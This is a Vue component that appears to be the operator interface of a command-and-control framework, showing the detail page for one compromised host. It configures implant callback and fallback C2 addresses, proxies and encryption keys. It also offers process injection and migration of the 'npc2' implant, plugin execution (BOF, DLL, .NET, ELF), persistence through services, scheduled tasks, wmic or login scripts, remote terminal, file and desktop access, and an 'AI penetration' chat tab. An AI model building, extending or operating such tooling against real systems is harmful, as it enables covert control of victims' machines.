<script setup>
import { ref, computed, nextTick, watch, onActivated, onDeactivated, onBeforeUnmount } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { ArrowLeft, Refresh, CircleClose, Delete } from '@element-plus/icons-vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { agentInfo, agentNote, taskList, taskQuery, taskDeleteAgent, agentProcList, agentProcKill, agentProcInject, agentNetList, pluginList, agentPersist, npc1ConfGet, npc1ConfSet } from '@/api/agent'
import { formatTime, platformColor } from '@/utils/format'
import { licenseAllowed } from '@/utils/license'
import { wsUrl } from '@/utils/config'
import { useAppStore } from '@/stores/app'
import { useAuthStore } from '@/stores/auth'
import { useAgentLogSocket } from '@/composables/useAgentLogSocket'
import TerminalView from '@/components/terminal/TerminalView.vue'
import FileManager from '@/components/filemanager/FileManager.vue'
import VirtualDesktop from '@/components/desktop/VirtualDesktop.vue'
import CommandConsole from './CommandConsole.vue'
import AiChat from './AiChat.vue'

defineOptions({ name: 'AgentDetail' })

const route = useRoute()
const router = useRouter()
const appStore = useAppStore()
const authStore = useAuthStore()

const agentId = computed(() => route.params.id)
const loading = ref(false)
const info = ref({})
const activeTab = ref('detail')
let lastLoadedAt = 0

const desktopMode = ref('vnc')

// SSH 原生连接：仅支持 详情/控制台/虚拟终端/文件管理
const isSsh = computed(() => info.value.ntype === 'ssh')

async function loadInfo(force = false) {
  if (!agentId.value) return
  const hasCache = info.value && info.value.id
  loading.value = force || !hasCache
  try {
    const res = await agentInfo(agentId.value)
    info.value = (res && res.result) || {}
    lastLoadedAt = Math.floor(Date.now() / 1000)
  } catch {

  } finally {
    loading.value = false
  }
}

async function loadInfoSilent() {
  if (!agentId.value) return
  try {
    const res = await agentInfo(agentId.value)
    info.value = (res && res.result) || {}
    lastLoadedAt = Math.floor(Date.now() / 1000)
  } catch {

  }
}

async function handleNote() {
  try {
    const { value } = await ElMessageBox.prompt('请输入备注', '编辑备注', {
      inputValue: info.value.note || '',
    })
    await agentNote(agentId.value, value || '')
    info.value.note = value || ''
    ElMessage.success('已保存')
  } catch (e) {

  }
}

function back() {
  router.push('/agents')
}

async function handleCloseConnection() {
  try {
    await ElMessageBox.confirm(
      '确认断开连接吗？',
      '断开连接',
      { type: 'warning', confirmButtonText: '断开', cancelButtonText: '取消' }
    )

    const id = agentId.value

    await router.push('/agents')
    await nextTick()

    appStore.requestEvict(id)
    ElMessage.success('已断开连接并清除缓存')
  } catch {

  }
}

let npc2Timer = null
let npc2Attempts = 0
const NPC2_MAX_ATTEMPTS = 60
const npc2Loading = ref(false)
const npc2Progress = computed(() => {
  if (!npc2Loading.value) return 100
  return Math.min(Math.round((npc2Attempts / NPC2_MAX_ATTEMPTS) * 100), 99)
})

function clearNpc2Timer() {
  if (npc2Timer) {
    clearInterval(npc2Timer)
    npc2Timer = null
  }
  npc2Attempts = 0
}

async function handleNpc2Change(loading) {
  if (loading) {
    clearNpc2Timer()
    npc2Attempts = 0
    npc2Loading.value = true
    npc2Timer = setInterval(async () => {
      npc2Attempts++
      await loadInfoSilent()
      if (info.value.npc2 || npc2Attempts >= NPC2_MAX_ATTEMPTS) {
        clearNpc2Timer()
        npc2Loading.value = false
        if (info.value.npc2) {
          ElMessage.success('NPC2 已加载，终端/文件/桌面/AI 已可用')
        } else {
          ElMessage.warning('NPC2 加载超时，请稍后重试')
        }
      }
    }, 3000)
  } else {

    clearNpc2Timer()
    npc2Loading.value = false
    setTimeout(loadInfoSilent, 1500)
  }
}

onBeforeUnmount(() => {
  clearNpc2Timer()
  pluginCloseWs()
})

const taskData = ref({ agent: [] })
const taskLoading = ref(false)
const { lastEvent } = useAgentLogSocket()

function applyTaskUpdate(rawData) {
  try {
    let bytes = rawData
    if (bytes instanceof ArrayBuffer) bytes = new Uint8Array(bytes)
    if (bytes instanceof Uint8Array) {
      const text = new TextDecoder().decode(bytes)
      const arr = JSON.parse(text)
      taskData.value.agent = Array.isArray(arr) ? arr : []
    }
  } catch {

  }
}

watch(lastEvent, (event) => {
  if (!event || !event.action) return
  if (event.action.act !== 'taskupdate') return
  if (event.id !== agentId.value) return
  applyTaskUpdate(event.action.data)
})

async function loadTasks() {
  if (!agentId.value) return
  taskLoading.value = true
  try {
    const res = await taskList(agentId.value)
    const result = (res && res.result) || { agent: [] }
    taskData.value.agent = result.agent || []
  } catch {

  } finally {
    taskLoading.value = false
  }
}

async function handleAgentTaskDelete(row) {
  try {
    await ElMessageBox.confirm('确认从 Agent 缓存中删除该任务？', '删除任务', {
      type: 'warning', confirmButtonText: '删除', cancelButtonText: '取消'
    })
    await taskDeleteAgent(agentId.value, row.id)
    ElMessage.success('已删除')
    taskData.value.agent = taskData.value.agent.filter((t) => t.id !== row.id)
  } catch {

  }
}

// NPC 配置管理（归属项目）：callback2 支持换行分隔多个备用地址
const confLoading = ref(false)
const confSaving = ref(false)
const confForm = ref({ callback1: '', callback2: '', domain: '', proxy: '', config: '', sleep: 0 })
const confEnckey = ref('')

async function loadConf() {
  if (!agentId.value) return
  // 仅 npc1 类型 agent 有回调配置（ssh/npc2 无项目归属，避免无效请求）
  if (info.value.ntype && info.value.ntype !== 'npc1') return
  confLoading.value = true
  try {
    const res = await npc1ConfGet(agentId.value)
    const d = (res && res.result) || {}
    confForm.value = {
      callback1: d.callback1 || '',
      callback2: d.callback2 || '',
      domain: d.domain || '',
      proxy: d.proxy || '',
      config: d.config || '',
      sleep: 0
    }
    confEnckey.value = d.enckey || ''
  } catch {
    ElMessage.error('获取配置失败')
  } finally {
    confLoading.value = false
  }
}

async function handleConfSave() {
  if (!confForm.value.callback1) {
    ElMessage.warning('主回调地址不能为空')
    return
  }
  confSaving.value = true
  try {
    await npc1ConfSet({ id: agentId.value, ...confForm.value, push: true })
    ElMessage.success('配置已保存并推送')
  } catch {
    ElMessage.error('保存配置失败')
  } finally {
    confSaving.value = false
  }
}

const procLoading = ref(false)
const procData = ref([])
const procSearch = ref('')
const filteredProcData = computed(() => {
  const list = !procSearch.value
    ? [...procData.value]
    : procData.value.filter((p) =>
        (p.name && p.name.toLowerCase().includes(procSearch.value.toLowerCase())) ||
        (p.cmdline && p.cmdline.toLowerCase().includes(procSearch.value.toLowerCase())) ||
        String(p.pid).includes(procSearch.value)
      )
  return list.sort((a, b) => (a.pid || 0) - (b.pid || 0))
})

async function loadProcList() {
  if (!agentId.value) return
  procLoading.value = true
  try {
    const res = await agentProcList(agentId.value)
    procData.value = (res && res.result) || []
  } catch (e) {
    ElMessage.error('获取进程列表失败')
  } finally {
    procLoading.value = false
  }
}

async function handleProcKill(row) {
  try {
    await ElMessageBox.confirm(
      `确认结束进程 ${row.name} (PID:${row.pid})？`,
      '结束进程',
      { type: 'warning', confirmButtonText: '结束', cancelButtonText: '取消' }
    )
    await agentProcKill(agentId.value, row.pid)
    ElMessage.success('已发送结束指令')
    procData.value = procData.value.filter((p) => p.pid !== row.pid)
  } catch {

  }
}

async function handleProcInject(row) {
  if (!licenseAllowed()) return
  try {
    await ElMessageBox.confirm(
      `确认注入进程 ${row.name} (PID:${row.pid})？将把 npc2 注入并迁移到该进程，原会话可能断开重连`,
      '进程注入',
      { type: 'warning', confirmButtonText: '注入', cancelButtonText: '取消' }
    )
    const res = await agentProcInject(agentId.value, row.pid, authStore.target)
    ElMessage.success((res && res.message) || '注入成功')
  } catch {

  }
}

// 维权管理
const persistForm = ref({ method: 'service', name: '', cmd: '', trigger: 'startup' })
const persistRunning = ref(false)
const persistOutput = ref('')

// 维权方式按平台自适应
const persistMethods = computed(() => {
  if (info.value.platform === 'linux') {
    return [
      { value: 'service', label: '加服务' },
      { value: 'schtasks', label: '加计划任务' },
      { value: 'profile', label: '登录执行' }
    ]
  }
  return [
    { value: 'service', label: '加服务' },
    { value: 'schtasks', label: '加计划任务' },
    { value: 'wmic', label: 'wmic调用启动' }
  ]
})

// 触发方式选项 (仅部分方式需要)
const persistTriggers = computed(() => {
  const m = persistForm.value.method
  const isLinux = info.value.platform === 'linux'
  if (m === 'schtasks') {
    const opts = [{ value: 'startup', label: isLinux ? '开机(@reboot)' : '开机启动' }]
    if (!isLinux) opts.push({ value: 'logon', label: '用户登录' })
    opts.push({ value: 'daily', label: '每日' }, { value: 'hourly', label: '每小时' })
    return opts
  }
  return []
})

// 切换方式后校正 trigger 选项
function handlePersistMethodChange() {
  if (!persistMethods.value.some((m) => m.value === persistForm.value.method)) {
    persistForm.value.method = persistMethods.value[0]?.value || 'service'
  }
  if (!persistTriggers.value.some((t) => t.value === persistForm.value.trigger)) {
    persistForm.value.trigger = persistTriggers.value[0]?.value || 'startup'
  }
}

async function handlePersist(action) {
  if (!persistForm.value.name.trim()) {
    ElMessage.warning('请先填写名称(服务名/任务名/订阅名)')
    return
  }
  if (action === 'install') {
    const label = persistMethods.value.find((m) => m.value === persistForm.value.method)?.label || persistForm.value.method
    try {
      await ElMessageBox.confirm(
        `确认通过「${label}」方式安装自启动「${persistForm.value.name.trim()}」？`,
        '安装维权',
        { type: 'warning', confirmButtonText: '安装', cancelButtonText: '取消' }
      )
    } catch {
      return
    }
  }
  persistRunning.value = true
  try {
    const res = await agentPersist(
      agentId.value,
      action,
      persistForm.value.method,
      persistForm.value.name.trim(),
      persistForm.value.cmd.trim(),
      persistForm.value.trigger
    )
    persistOutput.value = (res && res.message) || ''
    ElMessage.success('已执行, 结果见下方输出')
  } catch {

  } finally {
    persistRunning.value = false
  }
}

const netLoading = ref(false)
const netData = ref([])
const netSearch = ref('')
const filteredNetData = computed(() => {
  if (!netSearch.value) return netData.value
  const kw = netSearch.value.toLowerCase()
  return netData.value.filter((c) =>
    String(c.pid || '').includes(kw) ||
    (c.local_ip || '').toLowerCase().includes(kw) ||
    String(c.local_port || '').includes(kw) ||
    (c.remote_ip || '').toLowerCase().includes(kw) ||
    String(c.remote_port || '').includes(kw) ||
    (c.process || '').toLowerCase().includes(kw)
  )
})

async function loadNetList() {
  if (!agentId.value) return
  netLoading.value = true
  try {
    const res = await agentNetList(agentId.value)
    const list = (res && res.result) || []
    netData.value = list.sort((a, b) => (a.pid || 0) - (b.pid || 0))
  } catch (e) {
    ElMessage.error('获取网络连接失败')
  } finally {
    netLoading.value = false
  }
}

const pluginRunning = ref(false)
const pluginChunks = ref([])
const pluginItems = ref([])
const pluginForm = ref({ name: '', arch: '', entry: 'plugmain', args: '' })
let pluginWs = null
let pluginToken = ''

function inferPluginType(name) {
  const lower = (name || '').toLowerCase()
  if (lower.endsWith('.exe')) return 'exe'
  if (lower.endsWith('.dll')) return 'dll'
  if (lower.endsWith('.bof')) return 'bof'
  if (lower.endsWith('.net')) return 'net'
  if (lower.endsWith('.elf') || lower.endsWith('.so')) return 'elf'
  return ''
}

function formatMem(bytes) {
  if (bytes == null) return '-'
  const mb = bytes / 1024 / 1024
  if (mb < 1) return (bytes / 1024).toFixed(1) + 'K'
  return mb.toFixed(1) + 'M'
}

const compatiblePlugins = computed(() => {
  const platform = (info.value.platform || '').toLowerCase()
  const isWindows = platform.includes('windows')
  return pluginItems.value.filter((item) => {
    const ptype = item.type
    if (!ptype) return true
    if (isWindows) return ['exe', 'dll', 'bof', 'net'].includes(ptype)
    return ptype === 'elf'
  })
})

async function loadPluginList() {
  try {
    const res = await pluginList()
    const items = (res && res.result && res.result.items) || []
    pluginItems.value = items.map((p) => ({
      label: p.name,
      value: p.name,
      type: p.arch || inferPluginType(p.name),
    }))
  } catch {

  }
}

function handlePluginSelect() {
  const item = pluginItems.value.find((p) => p.value === pluginForm.value.name)
  if (item) {
    pluginForm.value.arch = item.type || ''
  }
}

function pluginCloseWs() {
  if (pluginWs) {
    try { pluginWs.close() } catch { }
    // 不在此处置 null: onclose 依赖 pluginWs === ws 判断当前会话,
    // 提前置空会导致 pluginRunning 永不复位 (执行按钮卡死)
  }
}

// 输出块: { text, stderr } — stdout/stderr 分色渲染
function pushPluginChunk(text, stderr = false) {
  if (!text) return
  const last = pluginChunks.value[pluginChunks.value.length - 1]
  if (last && last.stderr === stderr) {
    last.text += text
  } else {
    pluginChunks.value.push({ text, stderr })
  }
}

function handlePluginStop() {
  if (pluginWs && pluginWs.readyState === WebSocket.OPEN) {
    pluginWs.send(JSON.stringify({ act: 'stop', token: pluginToken }))
  }
}

function handlePluginRun() {
  if (!pluginForm.value.name) {
    ElMessage.warning('请选择插件')
    return
  }
  if (pluginRunning.value) return
  pluginChunks.value = []
  pluginToken = 'web-' + Date.now()
  const ws = new WebSocket(wsUrl(`/pluginws/${agentId.value}`))
  pluginWs = ws
  ws.onopen = () => {
    pluginRunning.value = true
    ws.send(JSON.stringify({
      act: 'run',
      token: pluginToken,
      name: pluginForm.value.name,
      arch: pluginForm.value.arch || inferPluginType(pluginForm.value.name) || '',
      entry: pluginForm.value.entry,
      args: pluginForm.value.args,
    }))
  }
  ws.onmessage = (ev) => {
    let msg = null
    try { msg = JSON.parse(ev.data) } catch { return }
    if (msg.token && msg.token !== pluginToken) return
    if (msg.event === 'output') {
      // 后端 protobuf 帧已转 UTF-8 文本, 无需 base64 解码
      if (msg.data) pushPluginChunk(msg.data, msg.stream === 'stderr')
    } else if (msg.event === 'exit') {
      pushPluginChunk(`\n[退出 code=${msg.code}${msg.success === false ? ' 失败' : ''}]`)
      // 立即复位, 不等 onclose (连接半开时 onclose 可能迟迟不来)
      pluginRunning.value = false
      pluginCloseWs()
    } else if (msg.event === 'error') {
      pushPluginChunk(`\n[错误] ${msg.message || ''}`, true)
      pluginRunning.value = false
      pluginCloseWs()
    }
  }
  ws.onclose = () => {
    if (pluginWs === ws) {
      pluginWs = null
      pluginRunning.value = false
    }
  }
  ws.onerror = () => {
    pushPluginChunk('\n[连接失败]', true)
  }
}

let inited = false
onActivated(() => {
  if (!agentId.value) return
  if (!inited) {
    inited = true
    loadInfo(true)
  } else {
    const now = Math.floor(Date.now() / 1000)
    if (now - lastLoadedAt > 5) loadInfoSilent()
  }
})

onDeactivated(() => {

  clearNpc2Timer()
  npc2Loading.value = false
})

watch(activeTab, (tab) => {
  if (tab === 'detail') {
    loadTasks()
    taskQuery(agentId.value)
    loadConf()
  } else if (tab === 'process') {
    loadProcList()
  } else if (tab === 'network') {
    loadNetList()
  } else if (tab === 'plugin') {
    loadPluginList()
  }
})

// 首次加载 agent 信息后拉取 npc 配置（detail 为默认 tab，activeTab watch 不会触发）
watch(() => info.value.id, (id) => {
  if (id) loadConf()
})
</script>

<template>
  <div class="page-container detail-page">
    <div class="detail-header">
      <el-button size="small" :icon="ArrowLeft" @click="back">返回</el-button>
      <div class="host-summary">
        <span class="host-ip">{{ info.intranet || agentId }}</span>
        <el-tag v-if="info.platform" size="small" :style="{ color: platformColor(info.platform) }" effect="plain">
          {{ info.platform }}
        </el-tag>
        <span v-if="info.username" class="host-user">{{ info.username }}@{{ info.hostname }}</span>
        <el-tag v-if="info.npc2" type="success" size="small">已连接</el-tag>
        <el-tag v-else type="info" size="small">仅心跳</el-tag>
      </div>
      <div class="flex-grow"></div>
      <el-button size="small" :icon="Refresh" :loading="loading" @click="loadInfo(true)">刷新</el-button>
      <el-button size="small" type="danger" plain :icon="CircleClose" @click="handleCloseConnection">断开</el-button>
    </div>

    <el-card shadow="never" class="detail-card" v-loading="loading">

      <div v-if="npc2Loading" class="npc2-progress-bar">
        <div class="npc2-progress-head">
          <span>NPC2 加载中...</span>
          <span class="npc2-progress-hint">{{ npc2Attempts }}/{{ NPC2_MAX_ATTEMPTS }} 轮询</span>
        </div>
        <el-progress
          :percentage="npc2Progress"
          :stroke-width="10"
          :show-text="false"
          status="success"
          :indeterminate="npc2Attempts === 0"
          striped
          striped-flow
        />
      </div>
      <div class="tabs-wrapper">
        <el-tabs v-model="activeTab" class="detail-tabs">

        <el-tab-pane label="NPC详情" name="detail">
          <div class="detail-scroll">
          <div class="info-grid" v-if="info.id">
            <div class="info-item">
              <span class="label">主机ID</span>
              <span class="value">{{ info.id }}</span>
            </div>
            <div class="info-item">
              <span class="label">类型</span>
              <span class="value">{{ info.ntype || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">内网地址</span>
              <span class="value">{{ info.intranet || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">外网地址</span>
              <span class="value">{{ info.internet || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">用户名</span>
              <span class="value">{{ info.username || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">主机名</span>
              <span class="value">{{ info.hostname || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">系统平台</span>
              <span class="value">{{ info.platform || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">架构</span>
              <span class="value">{{ info.arch || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">NPC2 状态</span>
              <span class="value">
                <el-tag v-if="info.npc2" type="success" size="small">已加载</el-tag>
                <el-tag v-else type="info" size="small">未加载</el-tag>
              </span>
            </div>
            <div class="info-item">
              <span class="label">PID</span>
              <span class="value">{{ info.pid || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">首次上线</span>
              <span class="value">{{ formatTime(info.firsteat) }}</span>
            </div>
            <div class="info-item">
              <span class="label">最近更新</span>
              <span class="value">{{ formatTime(info.updateat) }}</span>
            </div>
            <div class="info-item">
              <span class="label">进程</span>
              <span class="value">{{ info.process || '-' }}</span>
            </div>
            <div class="info-item">
              <span class="label">备注</span>
              <span class="value">
                {{ info.note || '-' }}
                <el-button text type="primary" size="small" @click="handleNote">编辑</el-button>
              </span>
            </div>
          </div>
          <el-empty v-else description="暂无详情数据" />

          <div class="detail-columns">
          <div class="task-section" v-if="info.ntype === 'npc1'">
            <div class="task-section-title">配置管理</div>
            <el-form label-width="110px" class="conf-form" v-loading="confLoading" @submit.prevent>
              <el-form-item label="主回调地址">
                <el-input v-model="confForm.callback1" placeholder="http://1.2.3.4:31000" />
              </el-form-item>
              <el-form-item label="备用地址">
                <el-input
                  v-model="confForm.callback2"
                  type="textarea"
                  :rows="3"
                  placeholder="每行一个，主地址不可用时按序切换"
                />
              </el-form-item>
              <el-form-item label="自定义Header">
                <el-input v-model="confForm.domain" placeholder="如 Host: xxx" />
              </el-form-item>
              <el-form-item label="代理">
                <el-input v-model="confForm.proxy" placeholder="socks5://127.0.0.1:1080" />
              </el-form-item>
              <el-form-item label="其它配置">
                <el-input v-model="confForm.config" type="textarea" :rows="2" />
              </el-form-item>
              <el-form-item label="心跳间隔">
                <el-input-number v-model="confForm.sleep" :min="0" :step="1" placeholder="秒，0 不下发" style="width: 180px" />
              </el-form-item>
              <el-form-item v-if="confEnckey" label="加密密钥">
                <span class="conf-enckey">{{ confEnckey }}</span>
              </el-form-item>
              <el-form-item>
                <el-button type="primary" :loading="confSaving" @click="handleConfSave">保存并推送</el-button>
                <el-button :loading="confLoading" @click="loadConf">刷新</el-button>
              </el-form-item>
            </el-form>
          </div>

          <div class="task-section" v-if="info.id">
            <div class="task-section-title">任务队列</div>
            <el-table v-loading="taskLoading" :data="taskData.agent" size="small" border stripe max-height="400" empty-text="暂无执行中任务">
              <el-table-column label="#" width="50" align="center">
                <template #default="{ $index }">{{ $index }}</template>
              </el-table-column>
              <el-table-column label="类型" prop="kind" width="90" />
              <el-table-column label="操作" prop="act" width="90" />
              <el-table-column label="详情" prop="detail" show-overflow-tooltip />
              <el-table-column label="状态" width="80" align="center">
                <template #default>
                  <el-tag type="warning" size="small">运行中</el-tag>
                </template>
              </el-table-column>
              <el-table-column label="开始时间" width="160">
                <template #default="{ row }">{{ formatTime(row.created_at) }}</template>
              </el-table-column>
              <el-table-column label="操作" width="80" fixed="right" align="right" class-name="op-col">
                <template #default="{ row }">
                  <el-button text type="danger" size="small" :icon="Delete" @click="handleAgentTaskDelete(row)">删除</el-button>
                </template>
              </el-table-column>
            </el-table>
          </div>
          </div>
          </div>
        </el-tab-pane>

        <el-tab-pane label="命令控制台" name="console" lazy>
          <div class="tab-panel">
            <CommandConsole :agent-id="agentId" :agent="info" @npc2-change="handleNpc2Change" />
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2" label="虚拟终端" name="terminal" lazy>
          <div class="tab-panel terminal-panel">
            <TerminalView :agent-id="agentId" />
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2" label="文件管理" name="files" lazy>
          <div class="tab-panel file-panel">
            <FileManager :agent-id="agentId" :has-npc1="info.ntype === 'npc1'" />
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2 && !isSsh" label="虚拟桌面" name="desktop" lazy>
          <div class="tab-panel desktop-panel">
            <VirtualDesktop v-model:mode="desktopMode" :agent-id="agentId" :platform="info.platform" />
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2 && !isSsh" label="进程管理" name="process" lazy>
          <div class="tab-panel">
            <div class="toolbar-row">
              <el-input
                v-model="procSearch"
                placeholder="搜索进程名/PID/命令行"
                size="small"
                clearable
                style="width: 260px"
              />
              <el-button size="small" :icon="Refresh" :loading="procLoading" @click="loadProcList">刷新</el-button>
            </div>
            <el-table
              v-loading="procLoading"
              :data="filteredProcData"
              size="small"
              border
              stripe
              height="100%"
              empty-text="暂无进程数据"
              class="fill-table"
            >
              <el-table-column label="PID" prop="pid" width="80" />
              <el-table-column label="进程名" prop="name" min-width="120" show-overflow-tooltip />
              <el-table-column label="CPU" width="80" align="right">
                <template #default="{ row }">{{ row.cpu != null ? row.cpu + '%' : '-' }}</template>
              </el-table-column>
              <el-table-column label="内存" width="90" align="right">
                <template #default="{ row }">{{ formatMem(row.memory) }}</template>
              </el-table-column>
              <el-table-column label="命令行" prop="cmdline" min-width="300" show-overflow-tooltip />
              <el-table-column label="操作" width="140" fixed="right" align="right" class-name="op-col">
                <template #default="{ row }">
                  <el-button v-if="info.platform === 'windows'" text type="primary" size="small" @click="handleProcInject(row)">注入</el-button>
                  <el-button text type="danger" size="small" @click="handleProcKill(row)">结束</el-button>
                </template>
              </el-table-column>
            </el-table>
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2 && !isSsh" label="网络管理" name="network" lazy>
          <div class="tab-panel">
            <div class="toolbar-row">
              <el-input
                v-model="netSearch"
                placeholder="搜索 PID/IP/端口/进程"
                size="small"
                clearable
                style="width: 260px"
              />
              <el-button size="small" :icon="Refresh" :loading="netLoading" @click="loadNetList">刷新</el-button>
            </div>
            <el-table
              v-loading="netLoading"
              :data="filteredNetData"
              size="small"
              border
              stripe
              height="100%"
              empty-text="暂无网络连接"
              class="fill-table"
            >
              <el-table-column label="本地地址" prop="local_ip" min-width="130" align="right" />
              <el-table-column label="本地端口" prop="local_port" width="90" align="left" />
              <el-table-column label="远程地址" prop="remote_ip" min-width="130" align="right" />
              <el-table-column label="远程端口" prop="remote_port" width="90" align="left" />
              <el-table-column label="进程" prop="process" min-width="180" show-overflow-tooltip />
              <el-table-column label="PID" prop="pid" width="80" />
            </el-table>
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2 && !isSsh" label="插件执行" name="plugin" lazy>
          <div class="tab-panel">
            <div class="plugin-exec-form">
              <el-select
                v-model="pluginForm.name"
                placeholder="选择插件"
                size="small"
                filterable
                style="width: 220px"
                @change="handlePluginSelect"
              >
                <el-option
                  v-for="item in compatiblePlugins"
                  :key="item.value"
                  :label="item.label"
                  :value="item.value"
                />
              </el-select>
              <el-input v-model="pluginForm.entry" placeholder="入口函数" size="small" style="width: 140px" />
              <el-input v-model="pluginForm.args" placeholder="参数" size="small" class="plugin-args-input" />
              <el-button size="small" type="primary" :disabled="pluginRunning" @click="handlePluginRun">执行</el-button>
              <el-button v-if="pluginRunning" size="small" type="danger" @click="handlePluginStop">停止</el-button>
            </div>
            <div class="plugin-output-wrap">
              <pre class="plugin-output" v-if="pluginChunks.length"><span
                v-for="(c, i) in pluginChunks"
                :key="i"
                :class="{ 'plugin-output-err': c.stderr }"
              >{{ c.text }}</span></pre>
              <pre v-else class="plugin-output">等待执行...</pre>
            </div>
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2 && !isSsh && (info.platform === 'windows' || info.platform === 'linux')" label="维权管理" name="persist" lazy>
          <div class="tab-panel">
            <div class="plugin-exec-form">
              <el-radio-group v-model="persistForm.method" size="small" @change="handlePersistMethodChange">
                <el-radio-button v-for="m in persistMethods" :key="m.value" :value="m.value">{{ m.label }}</el-radio-button>
              </el-radio-group>
              <el-input v-model="persistForm.name" placeholder="名称(服务名/任务名/订阅名)" size="small" style="width: 210px" />
              <el-select v-if="persistTriggers.length" v-model="persistForm.trigger" size="small" style="width: 120px">
                <el-option v-for="t in persistTriggers" :key="t.value" :label="t.label" :value="t.value" />
              </el-select>
              <el-input v-model="persistForm.cmd" placeholder="启动命令, 留空使用当前进程路径" size="small" class="plugin-args-input" />
              <el-button size="small" type="primary" :loading="persistRunning" @click="handlePersist('install')">安装</el-button>
              <el-button size="small" type="danger" :loading="persistRunning" @click="handlePersist('uninstall')">卸载</el-button>
              <el-button size="small" :loading="persistRunning" @click="handlePersist('status')">查询状态</el-button>
            </div>
            <div class="plugin-output-wrap">
              <pre class="plugin-output">{{ persistOutput || '等待操作...' }}</pre>
            </div>
          </div>
        </el-tab-pane>

        <el-tab-pane v-if="info.npc2" label="AI渗透" name="aichat" lazy>
          <div class="tab-panel">
            <AiChat :agent-id="agentId" :agent="info" />
          </div>
        </el-tab-pane>
        </el-tabs>
      </div>
    </el-card>
  </div>
</template>

<style scoped lang="scss">
.detail-page {
  display: flex;
  flex-direction: column;
  height: 100%;
}

.detail-header {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 8px;

  .host-summary {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-left: 4px;
  }
  .host-ip {
    font-size: 14px;
    font-weight: 600;
    color: var(--tk-accent);
    text-shadow: 0 0 8px var(--tk-accent-glow);
  }
  .host-user {
    color: var(--tk-accent-dim);
    font-size: 12px;
  }
  .flex-grow {
    flex: 1;
  }
}

.detail-card {
  flex: 1;
  min-height: 0;
  display: flex;
  flex-direction: column;

  :deep(.el-card__body) {
    flex: 1;
    min-height: 0;
    display: flex;
    flex-direction: column;
  }
}

.detail-tabs {
  flex: 1;
  min-height: 0;
  display: flex;
  flex-direction: column;

  :deep(.el-tabs__header) {
    margin: 0 0 8px;
  }
  :deep(.el-tabs__nav-wrap::after) {
    height: 1px;
  }
  :deep(.el-tabs__item) {
    height: 32px;
    line-height: 32px;
    padding: 0 12px !important;
    font-size: 13px;
  }
  :deep(.el-tabs__content) {
    flex: 1;
    min-height: 0;
  }
  :deep(.el-tab-pane) {
    height: 100%;
  }
}

.tabs-wrapper {
  position: relative;
  flex: 1;
  min-height: 0;
  display: flex;
  flex-direction: column;
}

.npc2-progress-bar {
  padding: 12px 16px;
  margin-bottom: 12px;
  background: var(--tk-bg-input);
  border: 1px solid var(--tk-accent);
  border-radius: 6px;
}
.npc2-progress-head {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
  font-size: 13px;
  color: var(--tk-accent);
}
.npc2-progress-hint {
  font-size: 12px;
  opacity: 0.7;
  font-family: 'Consolas', monospace;
}

.tab-panel {
  height: 100%;
  display: flex;
  flex-direction: column;
}

// 详情 tab 滚动容器（el-tabs__content 默认 overflow:hidden，内容超高会被裁掉）
.detail-scroll {
  height: 100%;
  overflow-y: auto;
  padding-right: 4px;
}

// 任务队列与配置管理左右平行，窄屏自动换行堆叠
.detail-columns {
  display: flex;
  flex-wrap: wrap;
  gap: 0 24px;
  align-items: flex-start;

  .task-section {
    flex: 1 1 420px;
    min-width: 0;
  }
}

.conf-form {
  max-width: 100%;
}
.conf-enckey {
  font-family: 'Consolas', monospace;
  font-size: 12px;
  word-break: break-all;
  opacity: 0.8;
}

.info-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 10px 24px;
  padding: 8px 4px;
}
.info-item {
  display: flex;
  align-items: baseline;
  gap: 12px;
  border-bottom: 1px solid var(--tk-border);
  padding-bottom: 8px;
}
.info-item .label {
  flex: 0 0 90px;
  text-align: right;
  color: var(--tk-accent-dim);
  font-size: 12px;
}
.info-item .value {
  flex: 1;
  text-align: left;
  color: var(--tk-accent-soft);
  font-size: 14px;
  word-break: break-all;
}

.task-section {
  margin-top: 16px;
}
.task-section-title {
  font-size: 13px;
  font-weight: 600;
  color: var(--tk-accent);
  margin-bottom: 8px;
  padding-bottom: 6px;
  border-bottom: 1px solid var(--tk-border);
}

.task-panel {
  overflow-y: auto;
}

.toolbar-row {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 10px;
  flex-shrink: 0;
}

.fill-table {
  flex: 1;
  min-height: 0;
}

.plugin-exec-form {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 12px;

  .plugin-args-input {
    flex: 1;
    min-width: 200px;
  }
}

.plugin-output-wrap {
  flex: 1;
  min-height: 200px;
  overflow: hidden;
  border: 1px solid var(--tk-border);
  border-radius: 4px;
  background: var(--tk-bg-input);
}

.plugin-output {
  margin: 0;
  padding: 12px;
  font-family: 'Consolas', 'Courier New', monospace;
  font-size: 13px;
  color: var(--tk-accent-soft);
  white-space: pre-wrap;
  word-break: break-all;
  max-height: 100%;
  overflow-y: auto;
}

.plugin-output-err {
  color: var(--el-color-danger);
}
</style>
